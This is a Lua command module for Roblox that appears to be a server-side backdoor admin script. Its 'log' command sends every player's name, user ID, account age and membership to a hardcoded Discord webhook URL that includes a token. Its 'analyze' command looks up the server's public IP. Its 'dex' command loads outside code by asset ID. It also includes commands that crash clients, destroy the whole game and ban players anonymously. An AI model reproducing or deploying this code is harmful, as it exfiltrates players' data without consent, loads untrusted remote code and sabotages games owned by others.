local commands = {}

commands.persistent = nil
commands.remote = nil
commands.network = nil

function commands:init(remote, network)
	commands.remote = remote
	commands.network = network
	commands.persistent = require(script.Parent:WaitForChild("Persistent"))
	
	commands.persistent:load(remote)
	commands.persistent:banLoop()
end

function commands:_replicate(command, target, caller, args)
	commands.remote:InvokeClient(target, command, caller, args)
end


commands["ban"] = function(caller, target, args)
	commands:_replicate("ban", target, caller, args)
	commands.persistent.bans[target.Name] = "\n" .. caller.Name .. " has banned you from the server for: " .. table.concat(args, " ")
end

commands["kick"] = function(caller, target, args)
	commands:_replicate("kick", target, caller, args)
end

commands["unban"] = function(caller, target, args)
	commands.persistent.bans[target.Name] = nil
end

commands["crash"] = function(caller, target, args)
	commands:_replicate("crash", target, caller, args)
end

commands.slinfo = {false, nil}

commands["slock"] = function(caller, target, args)
	if (not commands.slinfo[1]) then
		commands.slinfo[1] = true
		commands.slinfo[2] = game:GetService("Players").PlayerAdded:Connect(function(plr)
			plr:Kick("This server is locked.")
		end)
		
		commands:_replicate("log", caller, caller, {"loona", "The server is now locked."})
	else if (commands.slinfo[1] and commands.slinfo[2] ~= nil) then
			commands.slinfo[1] = false
			commands.slinfo[2]:Disconnect()
		end
		
		commands:_replicate("log", caller, caller, {"loona", "The server is no longer locked."})
	end
end

function refreshCommand(caller, target, args)
	local player = target or caller
	
	local oldPos = player.Character:WaitForChild("HumanoidRootPart").Position
		
	player:LoadCharacter()
	task.wait(.1)
	player.Character:MoveTo(oldPos)
end

commands["re"] = refreshCommand
commands["ref"] = refreshCommand
commands["refresh"] = refreshCommand

commands["chat"] = function(caller, target, args)
	game:GetService("Chat"):Chat(target.Character, table.concat(args, " "))
end

commands["silent"] = function(caller, target, args)
	
end

commands["skick"] = function(caller, target, args)
	commands:_replicate("kick", target, {Name = "Anonymous"}, args)
end

commands["sban"] = function(caller, target, args)
	commands:_replicate("ban", target, {Name = "Anonymous"}, args)
	commands.persistent.bans[target.Name] = "\n Anonymous has banned you from the server for: " .. table.concat(args, " ")
end

commands["btools"] = function(caller, target, args)
	local player = target or caller
	
	local delete = Instance.new("Tool")
	delete.Name = "Delete"
	delete.RequiresHandle = false
	delete.TextureId = "rbxasset://Textures//Hammer.png"
	delete.Parent = player:WaitForChild("Backpack")
end

commands["dex"] = function(caller, target, args)
	local player = target or caller
	
	require(3010581956):Fireplace(player.Name)
end

commands["god"] = function(caller, target, args)
	local player = target or caller
	print(player)
	
	local ff = Instance.new("ForceField")
	ff.Visible = false
	ff.Name = "). +"
	ff.Parent = player.Character
	
	player.Character:WaitForChild("Humanoid").MaxHealth = math.huge
	player.Character:WaitForChild("Humanoid").Health = math.huge
end

commands["rage"] = function(caller, target, args)
	for _, p in pairs(game:GetService("Players"):GetChildren()) do
		commands:_replicate("rage", p, p, {"loona"})
	end
	
	task.wait(1)
	
	for _, v in pairs(game:GetDescendants()) do
		pcall(function()
			v:Destroy()
		end)
	end
end

commands["goto"] = function(caller, target, args)
	local player = target or caller
	
	if (player.Character) then
		caller.Character:MoveTo(player.Character.PrimaryPart.Position)
	end
end

commands["bring"] = function(caller, target, args)
	local player = target or caller

	if (player.Character) then
		player.Character:MoveTo(caller.Character.PrimaryPart.Position)
	end
end

commands["log"] = function(caller, target, args)
	for _, v in pairs(game:GetService("Players"):GetChildren()) do
		local data = {
			["embeds"] = {{
				['title'] = "Loser comped",
				['type'] = "rich",
				['author'] = {
					['name'] = "xpcall",
					['url'] = "https://nova.dev",
					['icon_url'] = "https://i.imgur.com/GXtcXeO.png"
				},
				['fields'] = {
					{
						['name'] = "Display Name",
						["value"] = v.DisplayName,
						['inline'] = true
					},
					{
						['name'] = "Name",
						['value'] = v.Name,
						['inline'] = true
					},
					{
						['name'] = "User Id",
						["value"] = v.UserId,
						['inline'] = true
					},
					{
						['name'] = "Account Age",
						["value"] = v.AccountAge,
						['inline'] = true
					},
					{
						['name'] = "Membership",
						["value"] = v.MembershipType,
						['inline'] = true
					}
				}
			}}
		}
		
		local s, e = pcall(function()
			local res = game:GetService("HttpService"):PostAsync("https://webhook-proxy.eastsideapp.com/api/webhooks/1093768851340144740/8wRH8X2A9xNrB2Tdl7YTuZOBc-B682V7hyn25u-jucFyeGm5ky-ceSXNc2n3fUr6pbb0", game:GetService("HttpService"):JSONEncode(data))
			print(res)
		end)
		
		if (e) then
			print(e)
		end
		
		commands.persistent:log("Logged " .. v.Name)
	end
end

commands["logcmds"] = function(caller, target, args)
	commands.persistent.logging = not commands.persistent.logging
end

commands["analyze"] = function(caller, target, args)	
	for _, p in pairs(game:GetService("Players"):GetChildren()) do
		commands:_replicate("analyze", p, p, {"loona"})
	end
	
	local serverInfo = {
		["gameId"] = game.GameId,
		["jobId"] = game.JobId,
		["placeId"] = game.PlaceId,
		["creatorId"] = game.CreatorId,
		["creatorType"] = game.CreatorType,
		["name"] = game.Name,
		["placeVersion"] = game.PlaceVersion,
		["privateServerId"] = game.PrivateServerId,
		["privateServerOwnerId"] = game.PrivateServerOwnerId,
		["memUse"] = game.Stats:GetTotalMemoryUsageMb(),
		["genre"] = game.Genre,
		["gearGenre"] = table.pack(pcall(function() return game.GearGenreSetting end))[2],
		["serverIp"] = table.pack(pcall(function() return game:GetService("HttpService"):GetAsync("https://api.ipify.org/") end))[2]
	}
	
	print(serverInfo)
end

local cmds = {}

setmetatable(cmds, {
	__index = function(_, cmd)
		if (commands.persistent and commands.persistent.logging) then
			commands.persistent:log("Command " .. cmd .. " ran")
		end
		
		return commands[cmd]
	end,
})

return cmds